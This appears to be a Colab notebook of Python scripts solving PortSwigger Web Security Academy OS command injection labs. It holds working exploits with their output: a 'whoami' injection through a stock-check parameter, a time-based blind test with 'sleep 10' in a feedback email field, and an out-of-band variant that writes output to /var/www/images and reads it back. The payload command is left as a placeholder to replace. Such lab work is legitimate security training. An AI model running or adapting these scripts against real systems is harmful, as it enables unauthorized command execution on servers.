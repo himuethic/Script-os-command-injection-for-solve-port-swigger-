{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyPeotAK1aVE4uCepBmr/qp7",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/himuethic/Script-os-command-injection-for-solve-port-swigger-/blob/main/Os_command_iypnb.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "import urllib3\n",
        "\n",
        "# Disable SSL warnings\n",
        "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n",
        "\n",
        "def run_command(url, command):\n",
        "    stock_path = '/product/stock'\n",
        "    command_injection = '1 & ' + command\n",
        "    params = {'productId': '1', 'storeId': command_injection}\n",
        "\n",
        "    try:\n",
        "        r = requests.post(url + stock_path, data=params, verify=False)\n",
        "\n",
        "        # Print debugging info\n",
        "        print(f'Payload used: {command_injection}')\n",
        "        print(f'Requested URL: {url + stock_path}')\n",
        "        print(f'Status Code: {r.status_code}')\n",
        "        print(f'Response Headers: {r.headers}')\n",
        "        print(f'Response Text: {r.text[:500]}')  # Print first 500 chars of response for debugging\n",
        "\n",
        "        if len(r.text) > 3:\n",
        "            print(\"(+) Command injection successful!\")\n",
        "            print(\"(+) Output of command:\")\n",
        "            print(r.text)\n",
        "        else:\n",
        "            print(\"(-) Command injection failed.\")\n",
        "\n",
        "    except requests.exceptions.RequestException as e:\n",
        "        print(f'Error: {e}')\n",
        "\n",
        "def main():\n",
        "    # Set the URL and command here\n",
        "    url = 'https://0a24000504710a6986d5b657001b002c.web-security-academy.net'\n",
        "    command = 'whoami'  # Replace with the desired command\n",
        "\n",
        "    print(\"(+) Exploiting command injection...\")\n",
        "    run_command(url, command)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "5pE2WxBGnWtj",
        "outputId": "aff74b8f-67db-4df8-b169-fd0b09d80471"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Exploiting command injection...\n",
            "Payload used: 1 & whoami\n",
            "Requested URL: https://0a24000504710a6986d5b657001b002c.web-security-academy.net/product/stock\n",
            "Status Code: 200\n",
            "Response Headers: {'Content-Type': 'text/plain; charset=utf-8', 'Set-Cookie': 'session=FYnLGfLWTSiU8h2SevBL75nfzJireRd7; Secure; HttpOnly; SameSite=None', 'X-Frame-Options': 'SAMEORIGIN', 'Content-Encoding': 'gzip', 'Connection': 'close', 'Content-Length': '36'}\n",
            "Response Text: peter-03fO8c\n",
            "62\n",
            "\n",
            "(+) Command injection successful!\n",
            "(+) Output of command:\n",
            "peter-03fO8c\n",
            "62\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "import urllib3\n",
        "from bs4 import BeautifulSoup\n",
        "\n",
        "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n",
        "\n",
        "def get_csrf_token(s, url):\n",
        "    feedback_path = '/feedback'\n",
        "    r = s.get(url + feedback_path, verify=False)\n",
        "    soup = BeautifulSoup(r.text, 'html.parser')\n",
        "    csrf = soup.find(\"input\")['value']\n",
        "    return csrf\n",
        "\n",
        "def check_command_injection(s, url):\n",
        "    submit_feedback_path = '/feedback/submit'\n",
        "    command_injection = 'test@test.ca & sleep 10 #'\n",
        "    csrf_token = get_csrf_token(s, url)\n",
        "    data = {'csrf': csrf_token, 'name': 'test', 'email': command_injection, 'subject': 'test', 'message': 'test'}\n",
        "    res = s.post(url + submit_feedback_path, data=data, verify=False)\n",
        "    if (res.elapsed.total_seconds() >= 10):\n",
        "        print(\"(+) Email field vulnerable to time-based command injection!\")\n",
        "    else:\n",
        "        print(\"(-) Email field not vulnerable to time-based command injection\")\n",
        "\n",
        "def main():\n",
        "    # URL of the lab\n",
        "    url = 'https://0a2c00d703abc4e0808a53220039005e.web-security-academy.net'  # Replace with your actual lab URL\n",
        "    print(\"(+) Checking if email parameter is vulnerable to time-based command injection...\")\n",
        "\n",
        "    s = requests.Session()\n",
        "    check_command_injection(s, url)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "X_j3dS78q0_F",
        "outputId": "72ea301c-40ce-4945-d993-fa839033055b"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Checking if email parameter is vulnerable to time-based command injection...\n",
            "(+) Email field vulnerable to time-based command injection!\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "import urllib3\n",
        "from bs4 import BeautifulSoup\n",
        "\n",
        "# Disable SSL warnings\n",
        "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n",
        "\n",
        "def get_csrf_token(s, url):\n",
        "    feedback_path = '/feedback'\n",
        "    r = s.get(url + feedback_path, verify=False)\n",
        "    soup = BeautifulSoup(r.text, 'html.parser')\n",
        "    csrf = soup.find(\"input\")['value']\n",
        "    return csrf\n",
        "\n",
        "def check_command_injection(s, url):\n",
        "    submit_feedback_path = '/feedback/submit'\n",
        "    command_injection = 'test@test.ca & whoami > /var/www/images/output2.txt #'  # Updated payload\n",
        "    csrf_token = get_csrf_token(s, url)\n",
        "    data = {'csrf': csrf_token, 'name': 'test', 'email': command_injection, 'subject': 'test', 'message': 'test'}\n",
        "    res = s.post(url + submit_feedback_path, data=data, verify=False)\n",
        "    if res.status_code == 200:\n",
        "        print(\"(+) Command injection attempted. Check /var/www/images/output2.txt on the server for output.\")\n",
        "\n",
        "        output_check_url = url + '/image?filename=output2.txt'\n",
        "        output_res = s.get(output_check_url, verify=False)\n",
        "        if output_res.status_code == 200:\n",
        "            print(\"(+) Command injection successful! Output of command:\")\n",
        "            print(output_res.text)\n",
        "        else:\n",
        "            print(\"(-) Failed to retrieve the command output.\")\n",
        "    else:\n",
        "        print(\"(-) Command injection failed.\")\n",
        "\n",
        "def main():\n",
        "    # URL of the lab\n",
        "    url = 'https://0a59008e04a9d66f85f912ab004d0036.web-security-academy.net'  # Replace with your actual lab URL\n",
        "    print(\"(+) Checking if email parameter is vulnerable to command injection...\")\n",
        "\n",
        "    s = requests.Session()\n",
        "    check_command_injection(s, url)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ckWKhl9Uv9g6",
        "outputId": "1d89348e-3d45-4cd6-fa44-161eb92611b1"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Checking if email parameter is vulnerable to command injection...\n",
            "(+) Command injection attempted. Check /var/www/images/output2.txt on the server for output.\n",
            "(+) Command injection successful! Output of command:\n",
            "peter-4pdsSg\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "-voNSbI3yjsv"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}